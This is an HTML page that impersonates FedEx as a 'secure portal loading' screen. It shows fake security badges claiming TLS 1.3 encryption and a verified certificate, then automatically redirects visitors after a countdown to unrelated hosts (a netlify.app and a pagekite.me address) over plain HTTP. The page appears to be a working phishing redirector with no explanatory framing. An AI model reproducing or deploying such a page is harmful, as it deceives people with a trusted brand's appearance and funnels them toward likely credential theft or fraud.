<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>FedEx - Loading</title>
  
  <!-- Meta-refresh backup (will redirect after 6 seconds) -->
  <meta http-equiv="refresh" content="6;url=http://Secureprocess.netlify.app">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0a0f2e 0%, #1a1f3e 100%);
      color: #fff;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }
    
    /* Animated background elements */
    .bg-grid {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        linear-gradient(rgba(255, 102, 0, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 102, 0, 0.03) 1px, transparent 1px);
      background-size: 50px 50px;
      z-index: -1;
    }
    
    .floating-orbs {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: -1;
      overflow: hidden;
    }
    
    .orb {
      position: absolute;
      border-radius: 50%;
      background: radial-gradient(circle at center, rgba(77, 20, 140, 0.1) 0%, transparent 70%);
    }
    
    .orb-1 {
      width: 300px;
      height: 300px;
      top: -100px;
      right: -100px;
      background: radial-gradient(circle at center, rgba(77, 20, 140, 0.15) 0%, transparent 70%);
    }
    
    .orb-2 {
      width: 200px;
      height: 200px;
      bottom: -50px;
      left: -50px;
      background: radial-gradient(circle at center, rgba(255, 102, 0, 0.1) 0%, transparent 70%);
    }
    
    /* Main container */
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      max-width: 800px;
      padding: 40px;
      z-index: 10;
    }
    
    /* FedEx Logo Animation */
    .logo-container {
      margin-bottom: 60px;
      position: relative;
    }
    
    .fedex-logo {
      font-size: 5.5rem;
      font-weight: 900;
      letter-spacing: -3px;
      display: inline-block;
      position: relative;
    }
    
    .fed {
      color: #4d148c;
      position: relative;
      z-index: 2;
      text-shadow: 0 0 30px rgba(77, 20, 140, 0.5);
    }
    
    .ex {
      color: #ff6600;
      position: relative;
      z-index: 2;
      text-shadow: 0 0 30px rgba(255, 102, 0, 0.5);
    }
    
    /* Animated underline */
    .logo-underline {
      height: 8px;
      width: 100%;
      background: linear-gradient(90deg, #4d148c, #ff6600);
      border-radius: 4px;
      margin-top: 10px;
      position: relative;
      overflow: hidden;
    }
    
    .logo-underline::after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
      animation: shine 2s infinite;
    }
    
    /* Loading animation */
    .loading-container {
      margin: 40px 0;
      width: 100%;
      max-width: 400px;
    }
    
    .loading-text {
      font-size: 1.2rem;
      color: rgba(255, 255, 255, 0.7);
      margin-bottom: 20px;
      letter-spacing: 1px;
    }
    
    .loading-bar {
      height: 6px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 3px;
      overflow: hidden;
      position: relative;
    }
    
    .loading-progress {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #4d148c, #ff6600);
      border-radius: 3px;
      animation: loading 5s linear forwards;
    }
    
    /* Countdown */
    .countdown {
      font-size: 1.5rem;
      margin-top: 30px;
      font-weight: 600;
      background: rgba(255, 255, 255, 0.05);
      padding: 15px 30px;
      border-radius: 50px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .countdown-number {
      color: #ff6600;
      font-weight: 800;
      font-size: 2rem;
      display: inline-block;
      min-width: 50px;
    }
    
    /* Status message */
    .status {
      margin-top: 30px;
      color: rgba(255, 255, 255, 0.6);
      font-size: 0.9rem;
      letter-spacing: 0.5px;
    }
    
    .security-badge {
      display: inline-flex;
      align-items: center;
      background: rgba(0, 255, 136, 0.1);
      color: #00ff88;
      padding: 8px 16px;
      border-radius: 20px;
      margin-top: 20px;
      font-size: 0.85rem;
    }
    
    .security-badge::before {
      content: 'ðŸ”’';
      margin-right: 8px;
    }
    
    /* Pulsing dot animation */
    .pulse-dot {
      display: inline-block;
      width: 8px;
      height: 8px;
      background: #00ff88;
      border-radius: 50%;
      margin-right: 8px;
      animation: pulse 1.5s infinite;
    }
    
    /* Manual redirect link */
    .manual-redirect {
      margin-top: 30px;
    }
    
    .manual-redirect a {
      color: #ff6600;
      text-decoration: none;
      font-weight: 600;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 12px 24px;
      border-radius: 25px;
      background: rgba(255, 102, 0, 0.1);
      transition: all 0.3s ease;
      border: 1px solid rgba(255, 102, 0, 0.3);
    }
    
    .manual-redirect a:hover {
      background: rgba(255, 102, 0, 0.2);
      transform: translateY(-2px);
    }
    
    /* Animations */
    @keyframes shine {
      0% { left: -100%; }
      100% { left: 100%; }
    }
    
    @keyframes loading {
      0% { width: 0%; }
      100% { width: 100%; }
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.5; transform: scale(1.1); }
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    /* Responsive */
    @media (max-width: 768px) {
      .fedex-logo {
        font-size: 4rem;
      }
      
      .container {
        padding: 20px;
      }
      
      .countdown {
        font-size: 1.2rem;
        padding: 12px 24px;
      }
      
      .countdown-number {
        font-size: 1.5rem;
      }
    }
    
    @media (max-width: 480px) {
      .fedex-logo {
        font-size: 3rem;
        letter-spacing: -2px;
      }
      
      .loading-text {
        font-size: 1rem;
      }
    }
  </style>
</head>
<body>
  <div class="bg-grid"></div>
  
  <div class="floating-orbs">
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
  </div>
  
  <div class="container">
    <div class="logo-container">
      <div class="fedex-logo">
        <span class="fed">Fed</span><span class="ex">Ex</span>
      </div>
      <div class="logo-underline"></div>
    </div>
    
    <div class="loading-container">
      <div class="loading-text">
        <span class="pulse-dot"></span>
        SECURE PORTAL LOADING
      </div>
      <div class="loading-bar">
        <div class="loading-progress"></div>
      </div>
    </div>
    
    <div class="countdown">
      Redirecting in <span class="countdown-number" id="counter">5</span> seconds
    </div>
    
    <div class="status">
      Preparing secure connection to FedEx processing system
    </div>
    
    <div class="security-badge">
      TLS 1.3 Encrypted â€¢ Certificate Verified
    </div>
    
    <div class="manual-redirect">
      <a href="http://Secureprocess.netlify.app" id="manualRedirect">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M13 3L20.2 10.2M20.2 10.2V3.8M20.2 10.2H13.8M13 21H6C4.89543 21 4 20.1046 4 19V5C4 3.89543 4.89543 3 6 3H13" 
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        Click to redirect now
      </a>
    </div>
  </div>

  <script>
    (function(){
      const target = 'http://Secureprocess.pagekite.me';
      let count = 5;
      const counterEl = document.getElementById('counter');
      const manualRedirectEl = document.getElementById('manualRedirect');
      
      // Add fade-in animation to elements
      document.querySelectorAll('.logo-container, .loading-container, .countdown, .status, .security-badge, .manual-redirect').forEach((el, index) => {
        el.style.animation = `fadeIn 0.8s ease forwards ${index * 0.2}s`;
        el.style.opacity = '0';
      });
      
      // Update countdown every second
      const countdownInterval = setInterval(() => {
        count -= 1;
        if (count < 0) {
          clearInterval(countdownInterval);
          return;
        }
        counterEl.textContent = String(count);
        
        // Add pulse effect when count changes
        counterEl.style.transform = 'scale(1.2)';
        setTimeout(() => {
          counterEl.style.transform = 'scale(1)';
        }, 300);
      }, 1000);
      
      // Redirect after 5 seconds
      setTimeout(() => {
        counterEl.textContent = '0';
        counterEl.style.color = '#00ff88';
        
        // Final animation before redirect
        document.querySelector('.countdown').style.transform = 'scale(1.05)';
        document.querySelector('.countdown').style.transition = 'transform 0.3s ease';
        
        // Redirect after brief pause
        setTimeout(() => {
          window.location.replace(target);
        }, 500);
      }, 5000);
      
      // Manual redirect handler
      manualRedirectEl.addEventListener('click', (e) => {
        e.preventDefault();
        
        // Show immediate redirect feedback
        counterEl.textContent = '0';
        counterEl.style.color = '#00ff88';
        document.querySelector('.loading-progress').style.width = '100%';
        document.querySelector('.loading-progress').style.transition = 'width 0.3s ease';
        
        // Redirect immediately
        setTimeout(() => {
          window.location.replace(target);
        }, 300);
      });
      
      // Add some dynamic effects
      document.addEventListener('mousemove', (e) => {
        const x = (e.clientX / window.innerWidth) * 100;
        const y = (e.clientY / window.innerHeight) * 100;
        
        document.querySelector('.orb-1').style.transform = `translate(${x * 0.02}px, ${y * 0.02}px)`;
        document.querySelector('.orb-2').style.transform = `translate(${x * -0.03}px, ${y * -0.03}px)`;
      });
    })();
  </script>
</body>
</html>
